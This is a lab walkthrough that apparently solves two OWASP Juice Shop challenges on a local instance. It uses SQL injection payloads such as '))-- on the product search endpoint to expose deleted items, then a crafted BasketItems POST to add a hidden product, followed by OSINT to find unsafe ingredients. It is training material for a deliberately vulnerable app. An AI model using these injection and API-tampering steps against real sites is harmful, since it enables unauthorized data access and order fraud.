Notes: Order the Christmas Special Offer of 2014 & Unsafe Product Investigation
Objective 1: Order the Christmas Special Offer of 2014
Step 1: Inspect Product Search Requests
Open:
http://localhost:3000/#/search

Press F5 and monitor the Network tab in DevTools.
Identify the request:
GET /rest/products/search?q=


Observation

The application retrieves product data through a single request during page load.
The search field appears to filter already-loaded data rather than performing server-side searches.
Screenshot Placeholder

[SCREENSHOT: Network tab showing GET /rest/products/search?q=]

Step 2: Verify Search Endpoint Behavior

Test the endpoint directly:

http://localhost:3000/rest/products/search?q=orange


Expected result:

JSON response containing products matching "orange".
Screenshot Placeholder

[SCREENSHOT: JSON search results for "orange"]

Step 3: Test for SQL Injection

Attempt:

http://localhost:3000/rest/products/search?q=';


Expected result:

Error page containing:
SQLITE_ERROR: syntax error


This confirms SQL injection is possible.

Screenshot Placeholder

[SCREENSHOT: SQLITE_ERROR syntax error]

Step 4: Bypass Query Logic

Testing:

'--


Results in:

SQLITE_ERROR: incomplete input


Reason:

Unbalanced parentheses remain in the query.

Use:

'))--


Expected result:

Full product list returned.
Includes logically deleted products.
Locate:
Christmas Super-Surprise-Box (2014 Edition)


Record its:

ProductId = 10

Screenshot Placeholder

[SCREENSHOT: JSON output showing ProductId 10 and Christmas Super-Surprise-Box]

Step 5: Add Product to Basket

Navigate to:

http://localhost:3000/#/login


Log in with any user account.

Add any standard product to the basket.

Determine your basket ID:

From Network requests, or
From Session Storage (bid variable).
Screenshot Placeholder

[SCREENSHOT: BasketId in Network tab or Session Storage]

Step 6: Insert Hidden Product

Send:

POST http://localhost:3000/api/BasketItems
Content-Type: application/json


Body:

{
  "BasketId": "<Your Basket ID>",
  "ProductId": 10,
  "quantity": 1
}

Screenshot Placeholder

[SCREENSHOT: POST request adding ProductId 10]

Step 7: Verify Basket

Open:

http://localhost:3000/#/basket


Verify:

Christmas Super-Surprise-Box (2014 Edition)


appears in the basket.

Screenshot Placeholder

[SCREENSHOT: Basket containing Christmas Super-Surprise-Box]

Step 8: Complete Challenge

Click:

Checkout


Challenge solved.

Screenshot Placeholder

[SCREENSHOT: Challenge completion message]

Alternative Method (Without SQL Injection)
Retrieve Product List

Open:

http://localhost:3000/rest/products/search?q=

Tasks
Record all missing IDs from the otherwise sequential list.
Add each missing product ID to the basket using:
{
  "BasketId": "<Your Basket ID>",
  "ProductId": "<Missing ID>",
  "quantity": 1
}

Repeat until:
Christmas Super-Surprise-Box (2014 Edition)


appears.

Checkout to complete the challenge.
Objective 2: Identify an Unsafe Product
Step 1: Locate Deleted Products

Use either method from the previous challenge to enumerate deleted products.

Continue until finding:

Rippertuer Special Juice

Screenshot Placeholder

[SCREENSHOT: Rippertuer Special Juice product details]

Step 2: Analyze Product Description

Notice the warning:

This item has been made unavailable because of lack of safety standards.


Partial ingredients shown:

Cherymoya (Annona cherimola)
Jabuticaba (Myrciaria cauliflora)
Bael (Aegle marmelos)
Others...

Submitting these ingredients will not solve the challenge.

Step 3: Research Ingredient Source

Search:

Cherymoya Annona cherimola Jabuticaba Myrciaria cauliflora Bael Aegle marmelos


Locate:

Top 20 Fruits You Probably Don't Know


Read the comments and find a post referencing:

Rippertuer Special Juice


with a Pastebin link.

Screenshot Placeholder

[SCREENSHOT: Blog comment referencing Rippertuer Special Juice]

Step 4: Review Pastebin Ingredients

Open the referenced Pastebin entry:

Rippertuer Special Juice Ingredients


Review the JSON ingredient list.

Screenshot Placeholder

[SCREENSHOT: Ingredient JSON document]

Step 5: Identify Dangerous Combination

Carefully inspect descriptions.

Find the warning for:

Hueteroneel


which mentions:

this coupled with Eurogium Edule was sometimes found fatal


Since:

Eurogium Edule


also appears in the ingredient list, these are the dangerous ingredients.

Answer

Eurogium Edule
Hueteroneel
Step 6: Submit Report

Open:

http://localhost:3000/#/contact


Submit a message containing:

Eurogium Edule
Hueteroneel


Challenge solved.

Screenshot Placeholder

[SCREENSHOT: Submitted contact form]

Screenshot Placeholder

[SCREENSHOT: Challenge completion confirmation]

Key Findings
Hidden Product
Item	ValueProduct	Christmas Super-Surprise-Box (2014 Edition)
Product ID	10
Unsafe Juice Ingredients
Ingredient	RiskHueteroneel	Dangerous when combined
Eurogium Edule	Dangerous when combined
Techniques Used
Network traffic inspection
API analysis
Hidden resource enumeration
SQL injection discovery
Basket manipulation through API requests
Open-source intelligence (OSINT)
Data correlation from public sources and product metadata
